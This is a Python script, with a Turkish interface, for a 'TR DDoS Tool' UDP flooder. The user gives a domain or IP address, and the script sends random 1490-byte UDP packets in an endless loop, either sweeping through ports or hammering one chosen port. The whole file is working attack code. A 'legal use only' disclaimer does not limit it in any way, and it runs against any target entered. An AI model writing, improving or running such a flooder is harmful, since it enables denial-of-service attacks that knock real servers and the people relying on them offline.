# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Version.
version = "1.2"


# Platform info
uname = system()

if uname == "Windows":
    cmd_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# RDDoS_Tool
while True:
    # UI.
    print("""
░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░ 
   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
   ░▒▓█▓▒░   ░▒▓███████▓▒░       ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
   ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░   
              """)
    print('                   Yalnızca yasal amaçlar için')
    print("\033[92;1m")
    print("1. Web Sitesi Alan Adı\n2. IP Adresi\n3. Hakkında\n4. Çıkış")
    print('\033[0m')

    # Input.
    opt = str(input("\n> "))

    # Selection.
    if opt == '1':
        domain = str(input("Alan adı: "))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Adresi: "))
        break

    elif opt == '3':
        print("""
▗▖ ▗▖ ▗▄▖ ▗▖ ▗▖▗▖ ▗▖▗▄▄▄▖▗▖  ▗▖▗▄▄▄  ▗▄▖ 
▐▌ ▐▌▐▌ ▐▌▐▌▗▞▘▐▌▗▞▘  █  ▐▛▚▖▐▌▐▌  █▐▌ ▐▌
▐▛▀▜▌▐▛▀▜▌▐▛▚▖ ▐▛▚▖   █  ▐▌ ▝▜▌▐▌  █▐▛▀▜▌
▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▌  ▐▌▐▙▄▄▀▐▌ ▐▌
              """)
        print("TR DDoS Tool açık kaynaklı bir araçtır")
        print("Ağları / sunucuları / diğer cihazları test etmek")
        print("için kullanılabilir.")
        print("Programın yazarı kullanımından sorumlu değildir")
        print("Herkes bu aracı YALNIZCA yasal durumlarda          üye-id: 'rst-00000002'")
        print("kullanmak ZORUNDADIR.")
        print("\nDaha fazla bilgi için proje sitesini ziyaret edin.")
        
        goon = input("\n\n\n\n\n\n\nDevam etmek için Enter'a basın.")
        os.system(cmd_clear)

    elif opt == '4':
        exit()

    else:
        print('\033[91mGeçersiz Seçim!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection.
port_mode = False
port = 2

while 1:
    port_bool = str(input("Belirli bir port mu? [e/h]: "))

    if (port_bool == "e") or (port_bool == "E"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "h") or (port_bool == "H"):
        break

    else:
        print('\033[91mGeçersiz Seçim!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mBAŞLATILIYOR....')
time.sleep(1)
print('ÇALIŞTIRILIYOR...')
time.sleep(4)

sent = 0

if port_mode == False:
    try:
        while True:
            if port == 65534:
                port = 1
            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1m%s paket %s adresine %s portu üzerinden gönderildi"%(sent, ip, port))
    except:
        print('\n\033[31;1mÇıkıldı\033[0m')

elif port_mode == True:
    if port < 2:
        port = 2
    elif port == 65534:
        port = 2
    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1m%s paket %s adresine %s portu üzerinden gönderildi"%(sent, ip, port))      
    except:
        print('\n\033[31;1mÇıkıldı\033[0m')